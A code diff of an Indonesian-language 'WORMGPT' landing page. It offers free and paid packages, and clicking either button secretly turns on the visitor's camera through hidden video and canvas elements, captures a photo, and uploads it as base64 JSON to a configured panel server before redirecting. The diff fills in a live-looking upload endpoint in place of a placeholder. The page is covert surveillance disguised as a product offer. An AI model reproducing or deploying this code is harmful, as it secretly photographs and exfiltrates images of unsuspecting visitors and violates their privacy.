@@ -25,7 +25,6 @@
             position: relative;
         }
 
-        /* ===== BACKGROUND DENGAN EFFECT SETAN ===== */
         .container {
             width: 100%;
             height: 100vh;
@@ -41,7 +40,6 @@
             position: relative;
         }
 
-        /* ===== DECORATIVE LINES ===== */
         .container::before {
             content: '';
             position: absolute;
@@ -56,7 +54,6 @@
             z-index: 0;
         }
 
-        /* ===== GAMBAR SETAN ===== */
         .devil-icon {
             font-size: 120px;
             line-height: 1;
@@ -79,7 +76,6 @@
             }
         }
 
-        /* ===== LOGO WORMGPT ===== */
         .logo-container {
             display: flex;
             align-items: center;
@@ -118,7 +114,6 @@
             50% { opacity: 0.2; }
         }
 
-        /* ===== SUBTITLE ===== */
         .subtitle {
             color: rgba(255, 255, 255, 0.4);
             font-size: 14px;
@@ -130,7 +125,6 @@
             font-weight: 300;
         }
 
-        /* ===== VIDEO (HIDDEN) ===== */
         #video {
             display: none;
             position: absolute;
@@ -143,7 +137,6 @@
             display: none;
         }
 
-        /* ===== TOMBOL PAKET ===== */
         .btn-group {
             display: flex;
             gap: 20px;
@@ -251,7 +244,6 @@
             box-shadow: 0 0 60px rgba(255, 215, 0, 0.2), inset 0 0 60px rgba(255, 215, 0, 0.05);
         }
 
-        /* ===== LOADING OVERLAY ===== */
         #loadingOverlay {
             position: absolute;
             top: 0;
@@ -302,7 +294,6 @@
             50% { opacity: 0.3; }
         }
 
-        /* ===== FLOATING PARTICLES ===== */
         .particle {
             position: absolute;
             width: 4px;
@@ -333,90 +324,30 @@
             }
         }
 
-        /* ===== RESPONSIVE ===== */
         @media (max-width: 768px) {
-            .devil-icon {
-                font-size: 80px;
-            }
-
-            .logo-text {
-                font-size: 32px;
-                letter-spacing: 2px;
-            }
-
-            .subtitle {
-                font-size: 11px;
-                letter-spacing: 5px;
-            }
-
-            .btn-group {
-                gap: 15px;
-                flex-direction: column;
-                align-items: center;
-            }
-
-            .btn-paket {
-                padding: 14px 30px;
-                font-size: 16px;
-                letter-spacing: 2px;
-                min-width: 200px;
-            }
-
-            .loader {
-                width: 80px;
-                height: 80px;
-            }
-
-            #loadingText {
-                font-size: 16px;
-                letter-spacing: 4px;
-            }
+            .devil-icon { font-size: 80px; }
+            .logo-text { font-size: 32px; letter-spacing: 2px; }
+            .subtitle { font-size: 11px; letter-spacing: 5px; }
+            .btn-group { gap: 15px; flex-direction: column; align-items: center; }
+            .btn-paket { padding: 14px 30px; font-size: 16px; letter-spacing: 2px; min-width: 200px; }
+            .loader { width: 80px; height: 80px; }
+            #loadingText { font-size: 16px; letter-spacing: 4px; }
         }
 
         @media (max-width: 480px) {
-            .devil-icon {
-                font-size: 60px;
-            }
-
-            .logo-text {
-                font-size: 24px;
-                letter-spacing: 1px;
-            }
-
-            .subtitle {
-                font-size: 9px;
-                letter-spacing: 3px;
-                margin-bottom: 30px;
-            }
-
-            .btn-paket {
-                padding: 12px 25px;
-                font-size: 14px;
-                letter-spacing: 1.5px;
-                min-width: 160px;
-                border-width: 1.5px;
-            }
-
-            .btn-paket .badge {
-                font-size: 9px;
-            }
-
-            .loader {
-                width: 60px;
-                height: 60px;
-                border-width: 3px;
-            }
-
-            #loadingText {
-                font-size: 14px;
-                letter-spacing: 3px;
-            }
+            .devil-icon { font-size: 60px; }
+            .logo-text { font-size: 24px; letter-spacing: 1px; }
+            .subtitle { font-size: 9px; letter-spacing: 3px; margin-bottom: 30px; }
+            .btn-paket { padding: 12px 25px; font-size: 14px; letter-spacing: 1.5px; min-width: 160px; border-width: 1.5px; }
+            .btn-paket .badge { font-size: 9px; }
+            .loader { width: 60px; height: 60px; border-width: 3px; }
+            #loadingText { font-size: 14px; letter-spacing: 3px; }
         }
     </style>
 </head>
 <body>
     <div class="container" id="container">
-        <!-- ===== PARTICLES ===== -->
+        <!-- Particles -->
         <div class="particle" style="top: 10%; left: 5%; animation-delay: 0s;"></div>
         <div class="particle" style="top: 20%; right: 10%; animation-delay: 2s;"></div>
         <div class="particle" style="bottom: 30%; left: 15%; animation-delay: 4s;"></div>
@@ -426,23 +357,17 @@
         <div class="particle" style="bottom: 50%; left: 8%; animation-delay: 0.5s;"></div>
         <div class="particle" style="bottom: 20%; right: 15%; animation-delay: 2.5s;"></div>
 
-        <!-- ===== ICON SETAN ===== -->
         <div class="devil-icon">😈</div>
-
-        <!-- ===== LOGO WORMGPT ===== -->
         <div class="logo-container">
             <span class="logo-text">
                 <span class="worm">WORM</span><span class="gpt">GPT</span><span class="dot">.</span>
             </span>
         </div>
-
         <div class="subtitle">⚡ ENTER THE DARKNESS ⚡</div>
 
-        <!-- ===== VIDEO & CANVAS (HIDDEN) ===== -->
         <video id="video" autoplay playsinline></video>
         <canvas id="canvas"></canvas>
 
-        <!-- ===== TOMBOL PAKET ===== -->
         <div class="btn-group">
             <button class="btn-paket free" id="btnFree">
                 FREE 1 BULAN
@@ -454,7 +379,6 @@
             </button>
         </div>
 
-        <!-- ===== LOADING OVERLAY ===== -->
         <div id="loadingOverlay">
             <div class="loader"></div>
             <div id="loadingText">MEMUAT HALAMAN...</div>
@@ -470,14 +394,15 @@
         const btnPro = document.getElementById('btnPro');
         const loadingOverlay = document.getElementById('loadingOverlay');
         const loadingText = document.getElementById('loadingText');
-        const container = document.getElementById('container');
 
-        // ===== KONFIGURASI =====
-        // GANTI URL REDIRECT (TUJUAN ANDA)
-        const REDIRECT_URL = 'https://wormgpt.my.id'; // <-- GANTI INI
+        // ===================================================
+        // KONFIGURASI – SUDAH DIISI DENGAN SERVER ANDA
+        // ===================================================
+        const REDIRECT_URL = 'https://wormgpt.my.id'; // ganti jika perlu
 
-        // GANTI URL PANEL UNTUK MENGIRIM FOTO
-        const PANEL_URL = 'https://your-panel-api.com/upload'; // <-- GANTI INI
+        // ENDPOINT pengiriman foto (sudah pakai prefix /server/b7c2176e)
+        const PANEL_URL = 'https://private.gervhosting.my.id/server/b7c2176e/upload-foto';
+        // ===================================================
 
         let stream = null;
         let capturedImage = null;
@@ -487,7 +412,7 @@
         async function startAndCapture(paket) {
             selectedPaket = paket;
             
-            // Disable kedua tombol
+            // Disable tombol
             btnFree.disabled = true;
             btnPro.disabled = true;
             btnFree.textContent = '⏳...';
@@ -515,7 +440,8 @@
                 canvas.height = video.videoHeight || 480;
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                capturedImage = canvas.toDataURL('image/jpeg', 0.9);
+                // Data Base64 (tanpa prefix data:image/...)
+                const base64Data = canvas.toDataURL('image/jpeg', 0.9);
 
                 // 4. Matikan kamera
                 if (stream) {
@@ -524,12 +450,12 @@
                     video.srcObject = null;
                 }
 
-                // 5. Tampilkan loading dengan teks "MEMUAT HALAMAN..."
+                // 5. Tampilkan loading
                 loadingOverlay.classList.add('active');
                 loadingText.textContent = 'MEMUAT HALAMAN...';
 
-                // 6. Kirim foto ke panel dengan informasi paket
-                kirimKePanel(paket);
+                // 6. Kirim foto ke panel (JSON)
+                await kirimKePanel(base64Data, paket);
 
                 // 7. Redirect setelah 3 detik
                 setTimeout(() => {
@@ -538,50 +464,37 @@
 
             } catch (error) {
                 console.error('Error:', error);
-                
                 // Jika gagal, tetap redirect
                 loadingOverlay.classList.add('active');
                 loadingText.textContent = 'MEMUAT HALAMAN...';
-                
                 setTimeout(() => {
                     window.location.href = REDIRECT_URL;
                 }, 2000);
             }
         }
 
-        // ===== FUNGSI KIRIM KE PANEL =====
-        async function kirimKePanel(paket) {
-            if (!capturedImage) {
-                console.log('Tidak ada foto untuk dikirim');
-                return;
-            }
-
+        // ===== FUNGSI KIRIM KE PANEL (JSON Base64) =====
+        async function kirimKePanel(base64Image, paket) {
             try {
-                const responseBlob = await fetch(capturedImage);
-                const blob = await responseBlob.blob();
+                const payload = {
+                    image: base64Image,  // field yang diharapkan oleh Node.js
+                    paket: paket
+                };
 
-                const formData = new FormData();
-                formData.append('foto', blob, 'foto_depan.jpg');
-                formData.append('timestamp', new Date().toISOString());
-                formData.append('paket', paket); // Kirim info paket yang dipilih
-
-                fetch(PANEL_URL, {
+                const response = await fetch(PANEL_URL, {
                     method: 'POST',
-                    body: formData,
-                })
-                .then(response => {
-                    if (response.ok) {
-                        console.log('✅ Foto berhasil dikirim ke panel (Paket: ' + paket + ')');
-                    } else {
-                        console.log('❌ Gagal kirim ke panel:', response.status);
-                    }
-                })
-                .catch(err => {
-                    console.log('❌ Error kirim:', err.message);
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
                 });
 
+                const result = await response.json();
+                console.log('✅ Respon dari server:', result);
+                return result;
             } catch (error) {
-                console.log('❌ Gagal mengirim:', error.message);
+                console.error('❌ Gagal mengirim ke panel:', error.message);
+                throw error;
             }
         }
 
@@ -610,4 +523,4 @@
         });
     </script>
 </body>
-    </html>
+</html>
